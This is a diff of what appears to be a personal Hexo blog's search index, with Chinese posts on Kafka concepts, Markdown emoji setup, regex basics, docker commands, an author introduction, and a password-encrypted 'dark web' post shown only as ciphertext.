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 </div>]]></content>
       <categories>
-        <category>工具</category>
+        <category>杂记</category>
       </categories>
-      <tags>
-        <tag>git</tag>
-      </tags>
   </entry>
   <entry>
-    <title>kafka</title>
-    <url>/2021/07/23/%E5%B7%A5%E5%85%B7/kafka/</url>
-    <content><![CDATA[<h2 id="消息队列模型"><a class="header-anchor" href="#消息队列模型"></a>消息队列模型</h2>
-<p>队列模型：最早的模型，消息先进先出，一条消息只能被一个消费者使用</p>
-<p><strong>发布-订阅模型</strong>：kafka使用的模型</p>
-<p><img src="/2021/07/23/%E5%B7%A5%E5%85%B7/kafka/image-20210714161917846.png" alt="image-20210714161917846"></p>
-<h2 id="基本概念"><a class="header-anchor" href="#基本概念"></a>基本概念</h2>
-<p><strong>生产者（Producer）</strong>——产生消息的一方</p>
-<p><strong>消费者（Consumer）</strong>——处理消息的一方</p>
-<p><strong>代理（Broker）</strong>——可以看作是一个独立的 Kafka 实例。多个 Kafka Broker 组成一个 Kafka Cluster（集群）</p>
-<p><strong>Topic（主题）</strong> : Producer 将消息发送到特定的主题，Consumer 通过订阅特定的 Topic(主题) 来消费消息。</p>
-<p><strong>Partition（分区）</strong> : Partition 属于 Topic 的一部分。一个 Topic 可以有多个 Partition ，并且同一 Topic 下的 Partition 可以分布在不同的 Broker 上，这也就表明一个 Topic 可以横跨多个 Broker 。</p>
+    <title>At the very beginning...</title>
+    <url>/2020/04/06/%E6%9D%82%E8%AE%B0/Beginning/</url>
+    <content><![CDATA[<p><img src="/2020/04/06/%E6%9D%82%E8%AE%B0/Beginning/h2USniLgmurJKMe.png" alt></p>
+<h2 id="为什么写博客"><a class="header-anchor" href="#为什么写博客"></a>为什么写博客</h2>
+<p>0.有自己的博客听起来更屌一点。</p>
+<p>1.记录和分享一些学到的东西。</p>
+<p>2.倒逼自己去学一些新东西。</p>
+<h2 id="关于我"><a class="header-anchor" href="#关于我"></a>关于我</h2>
+<p>信息安全菜鸡</p>
+<p>偶尔打打ctf找虐</p>
+<p>业余爱好拳击，徒步</p>
+<p>QQ：MTc1NTkzNjEyOQ</p>
+<p>欢迎交流 ~</p>
 ]]></content>
       <categories>
-        <category>工具</category>
+        <category>杂记</category>
       </categories>
-      <tags>
-        <tag>kafka</tag>
-        <tag>消息队列</tag>
-      </tags>
   </entry>
   <entry>
     <title>mysql的自动类型转换</title>
@@ -192,241 +92,28 @@
       </tags>
   </entry>
   <entry>
-    <title>At the very beginning...</title>
-    <url>/2020/04/06/%E6%9D%82%E8%AE%B0/Beginning/</url>
-    <content><![CDATA[<p><img src="/2020/04/06/%E6%9D%82%E8%AE%B0/Beginning/h2USniLgmurJKMe.png" alt></p>
-<h2 id="为什么写博客"><a class="header-anchor" href="#为什么写博客"></a>为什么写博客</h2>
-<p>0.有自己的博客听起来更屌一点。</p>
-<p>1.记录和分享一些学到的东西。</p>
-<p>2.倒逼自己去学一些新东西。</p>
-<h2 id="关于我"><a class="header-anchor" href="#关于我"></a>关于我</h2>
-<p>信息安全菜鸡</p>
-<p>偶尔打打ctf找虐</p>
-<p>业余爱好拳击，徒步</p>
-<p>QQ：MTc1NTkzNjEyOQ</p>
-<p>欢迎交流 ~</p>
-]]></content>
-      <categories>
-        <category>杂记</category>
-      </categories>
-  </entry>
-  <entry>
-    <title>在Markdown中使用emoji表情</title>
-    <url>/2020/04/07/%E5%B7%A5%E5%85%B7/%E5%9C%A8Markdown%E4%B8%AD%E4%BD%BF%E7%94%A8emoji%E8%A1%A8%E6%83%85/</url>
-    <content><![CDATA[<h2 id="emoji表情大全"><a class="header-anchor" href="#emoji表情大全"></a>emoji表情大全</h2>
-<p><img src="/2020/04/07/%E5%B7%A5%E5%85%B7/%E5%9C%A8Markdown%E4%B8%AD%E4%BD%BF%E7%94%A8emoji%E8%A1%A8%E6%83%85/u8SbATtdLwU5VjB.png" alt></p>
-<p>理想情况下，在Markdown编辑器中输入如上图所示的语句后将显示对应的emoji表情。但是否显示则取决于你的markdown解析器。</p>
-<h2 id="hexo博客使用emoji"><a class="header-anchor" href="#hexo博客使用emoji"></a>hexo博客使用emoji</h2>
-<p><strong>hexo</strong> 框架默认的markdown解析器是<code>hexo-renderer-marked</code>，并不支持emoji表情的解析。所以如果想要在博客文章里添加emoji表情😮，可以考虑使用<code>hexo-renderer-markdown-it</code> 解析器。</p>
-<p>首先打开Node.js的命令行并移动到你的博客根目录下</p>
-<p><img src="/2020/04/07/%E5%B7%A5%E5%85%B7/%E5%9C%A8Markdown%E4%B8%AD%E4%BD%BF%E7%94%A8emoji%E8%A1%A8%E6%83%85/jQKAbRWvhGMDFgx.png" alt></p>
-<p>卸载原有的<code>hexo-renderer-marked</code>：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">npm un hexo-renderer-marked -S</span><br></pre></td></tr></table></figure>
-<p>再安装<code>hexo-renderer-markdown-it</code> ：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">npm i hexo-renderer-markdown-it -S</span><br></pre></td></tr></table></figure>
-<p>完成之后安装所需的插件：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">npm i markdown-it-emoji -S</span><br></pre></td></tr></table></figure>
-<p>最后打开根目录下的<code>_config.yml</code>文件，添加以下配置：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">markdown:</span><br><span class="line">  render:</span><br><span class="line">    html: true # 在 markdown 文本中支持 html tag 标签</span><br><span class="line">    xhtmlOut: false # 需要 xtml 文档，使用 &lt;br &#x2F;&gt; 替代 &lt;br&gt;</span><br><span class="line">    breaks: true # 用 &lt;br&gt; 开始新的一行</span><br><span class="line">    linkify: true # 自动将 可能是链接的内容转换成链接</span><br><span class="line">    typographer: true # 印刷标识转换</span><br><span class="line">  plugins:</span><br><span class="line">    - markdown-it-emoji # emoji表情插件</span><br><span class="line">    - markdown-it-abbr # 可选</span><br><span class="line">    - markdown-it-footnote # 可选</span><br><span class="line">    - markdown-it-ins # 可选，</span><br><span class="line">    - markdown-it-sub # 可选，下标，如H2O</span><br><span class="line">    - markdown-it-sup # 可选，上标，如2^10</span><br><span class="line">  anchors:</span><br><span class="line">    level: 2</span><br><span class="line">    collisionSuffix: &#39;&#39;</span><br><span class="line">    permalink: false,</span><br><span class="line">    permalinkClass: &#39;header-anchor&#39;</span><br><span class="line">    permalinkSymbol: &#39;&#39;</span><br><span class="line">    case: 0</span><br><span class="line">    separator: &#39;&#39;</span><br></pre></td></tr></table></figure>
-<p>然后保存退出，再重新加载一下hexo即可。</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hexo clean</span><br><span class="line">hexo generate</span><br><span class="line">hexo server</span><br></pre></td></tr></table></figure>
-<p>参考来源： <a href="https://zucchiniy.cn/archives/953e2b.html">ZucchinY的博客</a></p>
+    <title>docker 常用命令</title>
+    <url>/2020/07/20/%E5%B7%A5%E5%85%B7/docker/</url>
+    <content><![CDATA[<h2 id="docker"><a class="header-anchor" href="#docker"></a>docker</h2>
+<p>从镜像启动容器</p>
+<p>-d: 后台运行</p>
+<p>-p: 端口映射，宿主机的2020端口映射到容器的80端口</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker run -d -p 2020:80 &#123;image&#125;</span><br></pre></td></tr></table></figure>
+<p>显示所有容器</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker container ls --all</span><br></pre></td></tr></table></figure>
+<p>启动/停止/重启/删除容器</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker start&#x2F;stop&#x2F;restart&#x2F;rm 容器名或容器ID</span><br></pre></td></tr></table></figure>
+<p>重命名容器</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker rename 原名 新名</span><br></pre></td></tr></table></figure>
+<p>进入容器内部</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker exec -it &#123;容器ID&#125; bash</span><br></pre></td></tr></table></figure>
 ]]></content>
       <categories>
         <category>工具</category>
-        <category>Markdown</category>
+        <category>docker</category>
       </categories>
       <tags>
-        <tag>Markdown</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>正则表达式学习笔记（留坑待填）</title>
-    <url>/2020/04/18/%E5%B7%A5%E5%85%B7/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%88%E4%B8%8D%E5%AE%9A%E6%9C%9F%E6%9B%B4%E6%96%B0%EF%BC%89/</url>
-    <content><![CDATA[<h2 id="简介"><a class="header-anchor" href="#简介"></a>简介</h2>
-<blockquote>
-<p>正则表达式是描述一组字符串特征的模式，用来匹配特定的字符串。 ——Ken Thompson</p>
-</blockquote>
-<p>一个正则表达式是一串特殊的字符串，它可以用于匹配一组字符串。比如</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">\d</span><br></pre></td></tr></table></figure>
-<p>就是一个简单的正则表达式，它可以用来匹配0~9范围内的任意<strong>一个数字</strong>。</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">^(\(\d&#123;3&#125;\)|^\d&#123;3&#125;[.-]?)?\d&#123;3&#125;[.-]?\d&#123;4&#125;$</span><br></pre></td></tr></table></figure>
-<p>而上面这个式子也是一个正则表达式，只不过复杂了一些，它可以匹配10位的北美电话号码。无论区号是否加括号，数字间是否有句点或连字符，它都可以匹配。</p>
-<p><strong>学习时用到的工具</strong>：</p>
-<p><a href="http://www.regexpal.com">Regexpal网站</a>：可以在线测试正则表达式</p>
-<p>…</p>
-<h2 id="基础"><a class="header-anchor" href="#基础"></a>基础</h2>
-<h3 id="字符的匹配"><a class="header-anchor" href="#字符的匹配"></a>字符的匹配</h3>
-<h4 id="字面值匹配"><a class="header-anchor" href="#字面值匹配"></a>字面值匹配</h4>
-<p>最简单的一种，比如一个数字字符串<code>666</code>，可以在目标文本中匹配所有的<code>666</code></p>
-<p><img src="/2020/04/18/%E5%B7%A5%E5%85%B7/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%88%E4%B8%8D%E5%AE%9A%E6%9C%9F%E6%9B%B4%E6%96%B0%EF%BC%89/fN1TQqSlujEPBCy.png" alt></p>
-<h4 id="字符组匹配"><a class="header-anchor" href="#字符组匹配"></a>字符组匹配</h4>
-<p>正则表达式将方括号<code>[]</code>视为特殊的元字符，因此方括号本身不参与匹配，而对括号内容进行匹配。</p>
-<p><code>[0-9]</code>这个正则表达式将会匹配0到9范围内的任意数字。要匹配任意3位数字可以用如下正则表达式</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[0-9][0-9][0-9]</span><br></pre></td></tr></table></figure>
-<h4 id="字符组简写式（元字符）"><a class="header-anchor" href="#字符组简写式（元字符）"></a>字符组简写式（元字符）</h4>
-<p>例如：<code>[0-9]</code>可以简写为<code>\d</code>，它们都能匹配0到9之间的任意一个数字。</p>
-<p>空白字符：</p>
-<p><code>\f</code>：换页符</p>
-<p><code>\n</code>：换行符</p>
-<p><code>\r</code>：回车符</p>
-<p><code>\t</code>：制表符（Tab的缩进）</p>
-<p><code>\v</code>：垂直制表符</p>
-<p><code>\s</code>：任意一个空白字符，等价于 [\f\n\r\t\v]</p>
-<p><code>\S</code>：对<code>\s</code>取非，即任意非空字符</p>
-<p>数字元字符：</p>
-<p><code>\d</code>：匹配任意阿拉伯数字</p>
-<p><code>\D</code>：匹配任意非数字字符（如连字符<code>-</code>)</p>
-<p>字母数字元字符：</p>
-<p><code>\w</code>：大小写字母，下划线和数字，等价于[a-zA-Z0-9]</p>
-<p><code>\W</code>：对<code>\w</code>取非</p>
-<h4 id="任意字符的匹配"><a class="header-anchor" href="#任意字符的匹配"></a>任意字符的匹配</h4>
-<p><code>.</code>：点号（英文句号）可以匹配任意字符（但一般不匹配换行符）。</p>
-<p><code>.</code>是元字符，表示它有特殊的含义，而不是字符本身的含义。如果需要匹配 . ，那么要用 \ 进行转义，即在 . 前面加上<code> \</code> 。</p>
-<h3 id="捕获分组和后向引用"><a class="header-anchor" href="#捕获分组和后向引用"></a>捕获分组和后向引用</h3>
-<p>将<code>\d</code>放到<code>()</code>中，则<code>\d</code>匹配到一个数字的同时该数字被捕获。捕获之后则可以被后向引用。</p>
-<p><code>\1</code>后向引用被捕获的字符。</p>
-<p>例如：正则表达式 <code>(\d)\d\1</code>  可以匹配 <code>101</code> 或者 <code>212</code> , <code>383</code> 等等,但无法匹配 <code>102</code> 。因为<code>\1</code>引用的是那个被捕获的字符，所以这个正则表达式匹配到的一定是某三个相连数字，其中第一个数字和第三个数字一定是相同的。</p>
-<h3 id="量词"><a class="header-anchor" href="#量词"></a>量词</h3>
-<p><code>\d{3}</code>匹配三个相连数字，这里<code>{3}</code>就是一个量词，花括号中可以有多个数字（用逗号<code>,</code>隔开）比如<code>{3,4}</code>表示3个或者4个；</p>
-<p><code>\d-?</code>匹配一个数字，如果该数字之后跟着一个连字符那么连字符也会被匹配到。这里的<code>?</code>也是一个量词，表示0个或1个；</p>
-<p>同理，其他常用的量词还有</p>
-<p><code>+</code>：表示1个或者多个</p>
-<p><code>*</code>：表示0个或者多个</p>
-<h3 id="括选文字符"><a class="header-anchor" href="#括选文字符"></a>括选文字符</h3>
-<p>现在可以看看下面这个比较健壮的表达式了，就是简介中的那个，它匹配10位的北美电话号码</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">^(\(\d&#123;3&#125;\)|^\d&#123;3&#125;[.-]?)?\d&#123;3&#125;[.-]?\d&#123;4&#125;$</span><br></pre></td></tr></table></figure>
-<p><code>^</code>匹配行起始位置，即<code>^</code>后面跟着的内容<code>(\(\d{3}\)|^\d{3}[.-]?)</code>必须出现在行首；</p>
-<p><code>\(</code>和<code>\)</code>就是将左右括号转义，让它表示其字面意思，而不是捕获分组的开始结束标志；</p>
-<p><code>|</code>表示或运算，即匹配<code>|</code>两边的内容之一；</p>
-<p><code>[.-]</code>匹配一个可选的点号（这里点号不再匹配任意字符）或连字符；</p>
-<p><code>$</code>匹配行的结束标志</p>
-<p>这个表达式最终匹配十位的北美电话号码，而且括号、连字符或者点号都是可选的。你可以试试不同格式的电话号码，看看它能否匹配。以上正则表达式中的捕获分组并不是必需的。分组是必要的，但是捕获不需要。更好的方法是使用非捕获分组。</p>
-<h2 id="模式匹配"><a class="header-anchor" href="#模式匹配"></a>模式匹配</h2>
-<p>留坑待填</p>
-]]></content>
-      <categories>
-        <category>工具</category>
-        <category>正则表达式</category>
-      </categories>
-      <tags>
-        <tag>正则表达式</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>dark web</title>
-    <url>/2020/07/21/%E6%9D%82%E8%AE%B0/dark_web/</url>
-    <content><![CDATA[<script src="/crypto-js.js"></script><script src="/mcommon.js"></script><h3 id="encrypt-message">Please enter the password to read the blog.</h3><link rel="stylesheet" href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap.min.css"> <link rel="stylesheet" href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap-theme.min.css"> <script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script> <script src="//cdn.bootcss.com/bootstrap/3.3.5/js/bootstrap.min.js"></script> <div id="security"> <div> <div class="input-group"> <input type="text" class="form-control" aria-label="Enter the password." id="pass"/> <div class="input-group-btn"> <button type="button" class="btn btn-default" onclick="decryptAES()">Decrypt</button> </div> </div> </div> </div> <div id="encrypt-blog" style="display:none"> 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